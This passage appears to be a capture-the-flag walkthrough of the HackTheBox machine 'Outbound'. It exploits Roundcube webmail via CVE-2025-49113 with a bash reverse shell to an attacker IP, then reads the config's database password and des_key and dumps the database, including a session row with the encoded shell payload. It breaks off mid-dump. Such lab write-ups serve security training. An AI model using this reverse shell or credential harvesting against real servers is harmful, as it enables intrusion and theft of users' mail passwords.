---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Outbound (THERE ARE STARTING CREDENTIALS ONCE AGAIN)
linux

## foothold

```
 nmap -sV -v -p- outbound.htb 
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Update `/etc/hosts` with `IP    outbound.htb`

Go to the outbound.htb -> redirect to mail.outbound.htb -> update `etc/hosts` -> `IP    outbound.htb mail.outbound.htb`

Founf interesting endpoint (maybe can be used for bypassing slow login attempt sequence):
http://mail.outbound.htb/plugins/password/helpers/MMWIP

search the internet for `Roundcube Webmail exploit` and we get https://github.com/fearsoff-org/CVE-2025-49113/blob/main/CVE-2025-49113.php

start a listener

```
nc -lvnp 1234
```

cve payload 
```
php exploit.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "/bin/bash -c 'bash -i > /dev/tcp/<ATTACKER-IP>/1234 0>&1'"
```

We find credentials for the DB in `../config/config.inc.php`.

## getting jacob (user)

In the `../config/config.inc.php` is also a **des_key**.

??? note "config.inc.php"

    ```bash
    cat config/config.inc.php
    <?php
    
    /*
     +-----------------------------------------------------------------------+
     | Local configuration for the Roundcube Webmail installation.           |
     |                                                                       |
     | This is a sample configuration file only containing the minimum       |
     | setup required for a functional installation. Copy more options       |
     | from defaults.inc.php to this file to override the defaults.          |
     |                                                                       |
     | This file is part of the Roundcube Webmail client                     |
     | Copyright (C) The Roundcube Dev Team                                  |
     |                                                                       |
     | Licensed under the GNU General Public License version 3 or            |
     | any later version with exceptions for skins & plugins.                |
     | See the README file for a full license statement.                     |
     +-----------------------------------------------------------------------+
    */
    
    $config = [];
    
    // Database connection string (DSN) for read+write operations
    // Format (compatible with PEAR MDB2): db_provider://user:password@host/database
    // Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
    // For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
    // NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
    //       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
    $config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
    
    // IMAP host chosen to perform the log-in.
    // See defaults.inc.php for the option description.
    $config['imap_host'] = 'localhost:143';
    
    // SMTP server host (for sending mails).
    // See defaults.inc.php for the option description.
    $config['smtp_host'] = 'localhost:587';
    
    // SMTP username (if required) if you use %u as the username Roundcube
    // will use the current username for login
    $config['smtp_user'] = '%u';
    
    // SMTP password (if required) if you use %p as the password Roundcube
    // will use the current user's password for login
    $config['smtp_pass'] = '%p';
    
    // provide an URL where a user can get support for this Roundcube installation
    // PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
    $config['support_url'] = '';
    
    // Name your service. This is displayed on the login screen and in the window title
    $config['product_name'] = 'Roundcube Webmail';
    
    // This key is used to encrypt the users imap password which is stored
    // in the session record. For the default cipher method it must be
    // exactly 24 characters long.
    // YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
    $config['des_key'] = 'rcmail-!24ByteDESkey*Str';
    
    // List of active plugins (in plugins/ directory)
    $config['plugins'] = [
        'archive',
        'zipdownload',
    ];
    
    // skin name: folder from skins/
    $config['skin'] = 'elastic';
    $config['default_host'] = 'localhost';
    $config['smtp_server'] = 'localhost';
    ```

In the database, we get sessions -> they are base64 encoded are contain an encoded password.

dump db: `mysqldump -h 127.0.0.1 -u roundcube -p'RCDBPass2025' roundcube`

??? note "database"

    ```sql
    mysqldump -h 127.0.0.1 -u roundcube -p'RCDBPass2025' roundcube
    /*M!999999\- enable the sandbox mode */
    -- MariaDB dump 10.19  Distrib 10.11.13-MariaDB, for debian-linux-gnu (x86_64)
    --
    -- Host: 127.0.0.1    Database: roundcube
    -- ------------------------------------------------------
    -- Server version       10.11.13-MariaDB-0ubuntu0.24.04.1
    
    /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
    /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
    /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
    /*!40101 SET NAMES utf8mb4 */;
    /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
    /*!40103 SET TIME_ZONE='+00:00' */;
    /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
    /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
    /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
    /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
    
    --
    -- Table structure for table `cache`
    --
    
    DROP TABLE IF EXISTS `cache`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `cache` (
      `user_id` int(10) unsigned NOT NULL,
      `cache_key` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
      `expires` datetime DEFAULT NULL,
      `data` longtext NOT NULL,
      PRIMARY KEY (`user_id`,`cache_key`),
      KEY `expires_index` (`expires`),
      CONSTRAINT `user_id_fk_cache` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `cache`
    --
    
    LOCK TABLES `cache` WRITE;
    /*!40000 ALTER TABLE `cache` DISABLE KEYS */;
    /*!40000 ALTER TABLE `cache` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `cache_index`
    --
    
    DROP TABLE IF EXISTS `cache_index`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `cache_index` (
      `user_id` int(10) unsigned NOT NULL,
      `mailbox` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
      `expires` datetime DEFAULT NULL,
      `valid` tinyint(1) NOT NULL DEFAULT 0,
      `data` longtext NOT NULL,
      PRIMARY KEY (`user_id`,`mailbox`),
      KEY `expires_index` (`expires`),
      CONSTRAINT `user_id_fk_cache_index` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `cache_index`
    --
    
    LOCK TABLES `cache_index` WRITE;
    /*!40000 ALTER TABLE `cache_index` DISABLE KEYS */;
    /*!40000 ALTER TABLE `cache_index` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `cache_messages`
    --
    
    DROP TABLE IF EXISTS `cache_messages`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `cache_messages` (
      `user_id` int(10) unsigned NOT NULL,
      `mailbox` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
      `uid` int(11) unsigned NOT NULL DEFAULT 0,
      `expires` datetime DEFAULT NULL,
      `data` longtext NOT NULL,
      `flags` int(11) NOT NULL DEFAULT 0,
      PRIMARY KEY (`user_id`,`mailbox`,`uid`),
      KEY `expires_index` (`expires`),
      CONSTRAINT `user_id_fk_cache_messages` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `cache_messages`
    --
    
    LOCK TABLES `cache_messages` WRITE;
    /*!40000 ALTER TABLE `cache_messages` DISABLE KEYS */;
    /*!40000 ALTER TABLE `cache_messages` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `cache_shared`
    --
    
    DROP TABLE IF EXISTS `cache_shared`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `cache_shared` (
      `cache_key` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
      `expires` datetime DEFAULT NULL,
      `data` longtext NOT NULL,
      PRIMARY KEY (`cache_key`),
      KEY `expires_index` (`expires`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `cache_shared`
    --
    
    LOCK TABLES `cache_shared` WRITE;
    /*!40000 ALTER TABLE `cache_shared` DISABLE KEYS */;
    /*!40000 ALTER TABLE `cache_shared` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `cache_thread`
    --
    
    DROP TABLE IF EXISTS `cache_thread`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `cache_thread` (
      `user_id` int(10) unsigned NOT NULL,
      `mailbox` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
      `expires` datetime DEFAULT NULL,
      `data` longtext NOT NULL,
      PRIMARY KEY (`user_id`,`mailbox`),
      KEY `expires_index` (`expires`),
      CONSTRAINT `user_id_fk_cache_thread` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `cache_thread`
    --
    
    LOCK TABLES `cache_thread` WRITE;
    /*!40000 ALTER TABLE `cache_thread` DISABLE KEYS */;
    /*!40000 ALTER TABLE `cache_thread` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `collected_addresses`
    --
    
    DROP TABLE IF EXISTS `collected_addresses`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `collected_addresses` (
      `address_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `changed` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
      `name` varchar(255) NOT NULL DEFAULT '',
      `email` varchar(255) NOT NULL,
      `user_id` int(10) unsigned NOT NULL,
      `type` int(10) unsigned NOT NULL,
      PRIMARY KEY (`address_id`),
      UNIQUE KEY `user_email_collected_addresses_index` (`user_id`,`type`,`email`),
      CONSTRAINT `user_id_fk_collected_addresses` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `collected_addresses`
    --
    
    LOCK TABLES `collected_addresses` WRITE;
    /*!40000 ALTER TABLE `collected_addresses` DISABLE KEYS */;
    /*!40000 ALTER TABLE `collected_addresses` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `contactgroupmembers`
    --
    
    DROP TABLE IF EXISTS `contactgroupmembers`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `contactgroupmembers` (
      `contactgroup_id` int(10) unsigned NOT NULL,
      `contact_id` int(10) unsigned NOT NULL,
      `created` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
      PRIMARY KEY (`contactgroup_id`,`contact_id`),
      KEY `contactgroupmembers_contact_index` (`contact_id`),
      CONSTRAINT `contact_id_fk_contacts` FOREIGN KEY (`contact_id`) REFERENCES `contacts` (`contact_id`) ON DELETE CASCADE ON UPDATE CASCADE,
      CONSTRAINT `contactgroup_id_fk_contactgroups` FOREIGN KEY (`contactgroup_id`) REFERENCES `contactgroups` (`contactgroup_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `contactgroupmembers`
    --
    
    LOCK TABLES `contactgroupmembers` WRITE;
    /*!40000 ALTER TABLE `contactgroupmembers` DISABLE KEYS */;
    /*!40000 ALTER TABLE `contactgroupmembers` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `contactgroups`
    --
    
    DROP TABLE IF EXISTS `contactgroups`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `contactgroups` (
      `contactgroup_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `user_id` int(10) unsigned NOT NULL,
      `changed` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
      `del` tinyint(1) NOT NULL DEFAULT 0,
      `name` varchar(128) NOT NULL DEFAULT '',
      PRIMARY KEY (`contactgroup_id`),
      KEY `contactgroups_user_index` (`user_id`,`del`),
      CONSTRAINT `user_id_fk_contactgroups` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `contactgroups`
    --
    
    LOCK TABLES `contactgroups` WRITE;
    /*!40000 ALTER TABLE `contactgroups` DISABLE KEYS */;
    /*!40000 ALTER TABLE `contactgroups` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `contacts`
    --
    
    DROP TABLE IF EXISTS `contacts`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `contacts` (
      `contact_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `changed` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
      `del` tinyint(1) NOT NULL DEFAULT 0,
      `name` varchar(128) NOT NULL DEFAULT '',
      `email` text NOT NULL,
      `firstname` varchar(128) NOT NULL DEFAULT '',
      `surname` varchar(128) NOT NULL DEFAULT '',
      `vcard` longtext DEFAULT NULL,
      `words` text DEFAULT NULL,
      `user_id` int(10) unsigned NOT NULL,
      PRIMARY KEY (`contact_id`),
      KEY `user_contacts_index` (`user_id`,`del`),
      CONSTRAINT `user_id_fk_contacts` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `contacts`
    --
    
    LOCK TABLES `contacts` WRITE;
    /*!40000 ALTER TABLE `contacts` DISABLE KEYS */;
    /*!40000 ALTER TABLE `contacts` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `dictionary`
    --
    
    DROP TABLE IF EXISTS `dictionary`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `dictionary` (
      `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `user_id` int(10) unsigned DEFAULT NULL,
      `language` varchar(16) NOT NULL,
      `data` longtext NOT NULL,
      PRIMARY KEY (`id`),
      UNIQUE KEY `uniqueness` (`user_id`,`language`),
      CONSTRAINT `user_id_fk_dictionary` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `dictionary`
    --
    
    LOCK TABLES `dictionary` WRITE;
    /*!40000 ALTER TABLE `dictionary` DISABLE KEYS */;
    /*!40000 ALTER TABLE `dictionary` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `filestore`
    --
    
    DROP TABLE IF EXISTS `filestore`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `filestore` (
      `file_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `user_id` int(10) unsigned NOT NULL,
      `context` varchar(32) NOT NULL,
      `filename` varchar(128) NOT NULL,
      `mtime` int(10) NOT NULL,
      `data` longtext NOT NULL,
      PRIMARY KEY (`file_id`),
      UNIQUE KEY `uniqueness` (`user_id`,`context`,`filename`),
      CONSTRAINT `user_id_fk_filestore` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `filestore`
    --
    
    LOCK TABLES `filestore` WRITE;
    /*!40000 ALTER TABLE `filestore` DISABLE KEYS */;
    /*!40000 ALTER TABLE `filestore` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `identities`
    --
    
    DROP TABLE IF EXISTS `identities`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `identities` (
      `identity_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `user_id` int(10) unsigned NOT NULL,
      `changed` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
      `del` tinyint(1) NOT NULL DEFAULT 0,
      `standard` tinyint(1) NOT NULL DEFAULT 0,
      `name` varchar(128) NOT NULL,
      `organization` varchar(128) NOT NULL DEFAULT '',
      `email` varchar(128) NOT NULL,
      `reply-to` varchar(128) NOT NULL DEFAULT '',
      `bcc` varchar(128) NOT NULL DEFAULT '',
      `signature` longtext DEFAULT NULL,
      `html_signature` tinyint(1) NOT NULL DEFAULT 0,
      PRIMARY KEY (`identity_id`),
      KEY `user_identities_index` (`user_id`,`del`),
      KEY `email_identities_index` (`email`,`del`),
      CONSTRAINT `user_id_fk_identities` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `identities`
    --
    
    LOCK TABLES `identities` WRITE;
    /*!40000 ALTER TABLE `identities` DISABLE KEYS */;
    INSERT INTO `identities` VALUES
    (1,1,'2025-06-07 13:55:18',0,1,'jacob','','jacob@localhost','','',NULL,0),
    (2,2,'2025-06-08 12:04:51',0,1,'mel','','mel@localhost','','',NULL,0),
    (3,3,'2025-06-08 13:28:55',0,1,'tyler','','tyler@localhost','','',NULL,0);
    /*!40000 ALTER TABLE `identities` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `responses`
    --
    
    DROP TABLE IF EXISTS `responses`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `responses` (
      `response_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `user_id` int(10) unsigned NOT NULL,
      `name` varchar(255) NOT NULL,
      `data` longtext NOT NULL,
      `is_html` tinyint(1) NOT NULL DEFAULT 0,
      `changed` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
      `del` tinyint(1) NOT NULL DEFAULT 0,
      PRIMARY KEY (`response_id`),
      KEY `user_responses_index` (`user_id`,`del`),
      CONSTRAINT `user_id_fk_responses` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `responses`
    --
    
    LOCK TABLES `responses` WRITE;
    /*!40000 ALTER TABLE `responses` DISABLE KEYS */;
    /*!40000 ALTER TABLE `responses` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `searches`
    --
    
    DROP TABLE IF EXISTS `searches`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `searches` (
      `search_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `user_id` int(10) unsigned NOT NULL,
      `type` int(3) NOT NULL DEFAULT 0,
      `name` varchar(128) NOT NULL,
      `data` text DEFAULT NULL,
      PRIMARY KEY (`search_id`),
      UNIQUE KEY `uniqueness` (`user_id`,`type`,`name`),
      CONSTRAINT `user_id_fk_searches` FOREIGN KEY (`user_id`) REFERENCES `users` (`user_id`) ON DELETE CASCADE ON UPDATE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `searches`
    --
    
    LOCK TABLES `searches` WRITE;
    /*!40000 ALTER TABLE `searches` DISABLE KEYS */;
    /*!40000 ALTER TABLE `searches` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `session`
    --
    
    DROP TABLE IF EXISTS `session`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `session` (
      `sess_id` varchar(128) NOT NULL,
      `changed` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
      `ip` varchar(40) NOT NULL,
      `vars` mediumtext NOT NULL,
      PRIMARY KEY (`sess_id`),
      KEY `changed_index` (`changed`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `session`
    --
    
    LOCK TABLES `session` WRITE;
    /*!40000 ALTER TABLE `session` DISABLE KEYS */;
    INSERT INTO `session` VALUES
    ('03as65d1gpg9ndr0o6a28ofjfq','2025-07-25 12:35:13','172.17.0.1','bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6IlY2aHZNYWNaWm9yckVPOU02cEdkTkltRy8wSHFFaUxUIjtsb2dpbl90aW1lfGk6MTc1MzQ0NjE5NDtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiI4ZWNKaDhRRVlBU2VlUU1mRWRLRk5OSU9UTSI7cmVxdWVzdF90b2tlbnxzOjMyOiJaTEU1SkpzTk5zRXUwTlZDeGNyZElKaGxBTnZZdlVhZyI7cGx1Z2luc3xhOjE6e3M6MjI6ImZpbGVzeXN0ZW1fYXR0YWNobWVudHMiO2E6MTp7czoxNTc6IiEiO2k6MDtPOjE2OiJDcnlwdF9HUEdfRW5naW5lIjoxOntTOjI2OiJcMDBDcnlwdF9HUEdfRW5naW5lXDAwX2dwZ2NvbmYiO1M6NTc6Ii9iaW4vYmFzaCAtYyAnYmFzaCAtaSA+IC9kZXYvdGNwLzEwXDJlMTBcMmUxNFwyZTExLzEyMzQgMD4mMSc7IyI7fWk6MDtiOjA7fSI7fX0iO2E6MTp7czoyMDoiMzE3NTM0NDYxOTQwNTc4OTAxMDAiO3M6NjQ6Ii92YXIvd3d3L2h0bWwvcm91bmRjdWJlL3RlbXAvUkNNVEVNUGF0dG1udDY4ODM3NzMyOGQ0NTcxNzY2MDk3ODYiO319fSI7aTowO086MTY6IkNyeXB0X0dQR19FbmdpbmUiOjE6e1M6MjY6IlwwMENyeXB0X0dQR19FbmdpbmVcMDBfZ3BnY29uZiI7Uzo1NzoiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTBcMmUxMFwyZTE0XDJlMTEvMTIzNCAwPiYxJzsjIjt9aTowO2I6MDt9Ijt9fXxOOzE6e3M6NToiZmlsZXMiO2E6MTp7czoyMDoiMzE3NTM0NDYxOTQwNTc4OTAxMDAiO2E6Njp7czo0OiJwYXRoIjtzOjY0OiIvdmFyL3d3dy9odG1sL3JvdW5kY3ViZS90ZW1wL1JDTVRFTVBhdHRtbnQ2ODgzNzczMjhkNDU3MTc2NjA5Nzg2IjtzOjQ6InNpemUiO2k6ODk7czo0OiJuYW1lIjtzOjY1OiJ4fGI6MDt0YXNrfHM6NDoibWFpbCI7c2tpbl9jb25maWd8YTo3OntzOjE3OiJzdXBwb3J0ZWRfbGF5b3V0cyI7YToxOntpOjA7czoxMDoid2lkZXNjcmVlbiI7fXM6MjI6ImpxdWVyeV91aV9jb2xvcnNfdGhlbWUiO3M6OToiYm9vdHN0cmFwIjtzOjE4OiJlbWJlZF9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE5OiJlZGl0b3JfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxNzoiZGFya19tb2RlX3N1cHBvcnQiO2I6MTtzOjI2OiJtZWRpYV9icm93c2VyX2Nzc19sb2NhdGlvbiI7czo0OiJub25lIjtzOjIxOiJhZGRpdGlvbmFsX2xvZ29fdHlwZXMiO2E6Mzp7aTowO3M6NDoiZGFyayI7aToxO3M6NToic21hbGwiO2k6MjtzOjEwOiJzbWFsbC1kYXJrIjt9fWltYXBfaG9zdHxzOjk6ImxvY2FsaG9zdCI7cGFnZXxpOjE7bWJveHxzOjU6IklOQk9YIjtzb3J0X2NvbHxzOjA6IiI7c29ydF9vcmRlcnxzOjQ6IkRFU0MiO1NUT1JBR0VfVEhSRUFEfGE6Mzp7aTowO3M6MTA6IlJFRkVSRU5DRVMiO2k6MTtzOjQ6IlJFRlMiO2k6MjtzOjE0OiJPUkRFUkVEU1VCSkVDVCI7fVNUT1JBR0VfUVVPVEF8YjowO1NUT1JBR0VfTElTVC1FWFRFTkRFRHxiOjE7bGlzdF9hdHRyaWJ8YTo2OntzOjQ6Im5hbWUiO3M6ODoibWVzc2FnZXMiO3M6MjoiaWQiO3M6MTE6Im1lc3NhZ2VsaXN0IjtzOjU6ImNsYXNzIjtzOjQyOiJsaXN0aW5nIG1lc3NhZ2VsaXN0IHNvcnRoZWFkZXIgZml4ZWRoZWFkZXIiO3M6MTU6ImFyaWEtbGFiZWxsZWRieSI7czoyMjoiYXJpYS1sYWJlbC1tZXNzYWdlbGlzdCI7czo5OiJkYXRhLWxpc3QiO3M6MTI6Im1lc3NhZ2VfbGlzdCI7czoxNDoiZGF0YS1sYWJlbC1tc2ciO3M6MTg6IlRoZSBsaXN0IGlzIGVtcHR5LiI7fQ=='),
